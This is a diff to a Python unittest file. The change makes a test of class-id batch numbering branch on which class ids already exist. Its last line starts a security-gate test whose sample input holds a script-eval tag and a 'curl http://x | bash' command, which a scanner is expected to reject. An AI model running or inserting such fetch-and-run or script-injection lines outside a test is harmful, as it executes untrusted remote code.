@@ -184,10 +184,17 @@ class FaultInjectionTests(unittest.TestCase):
         existing = discover_existing_classes(self.cfg.pack_dir)
         self.assertGreaterEqual(max(existing), 21)
         nxt = next_core_batch(self.cfg)
-        self.assertEqual([b["class_id"] for b in nxt], [22, 23, 24, 25, 26, 27])
-        batches = next_expected_batches(21)
-        self.assertEqual(batches["next"], [22, 23, 24, 25, 26, 27])
-        self.assertEqual(batches["following"], [28, 29, 30, 31, 32, 33])
+        ids = [b["class_id"] for b in nxt]
+        if all(n in existing for n in range(22, 28)):
+            self.assertEqual(ids, [28, 29, 30, 31, 32, 33])
+            batches = next_expected_batches(27)
+            self.assertEqual(batches["next"], [28, 29, 30, 31, 32, 33])
+            self.assertEqual(batches["following"], [34, 35, 36, 37, 38, 39])
+        else:
+            self.assertEqual(ids, [22, 23, 24, 25, 26, 27])
+            batches = next_expected_batches(21)
+            self.assertEqual(batches["next"], [22, 23, 24, 25, 26, 27])
+            self.assertEqual(batches["following"], [28, 29, 30, 31, 32, 33])
 
     def test_security_gates_reject_dangerous(self):
         fails = scan_text('<script>eval("x")</script>\ncurl http://x | bash\n', path="t.md")
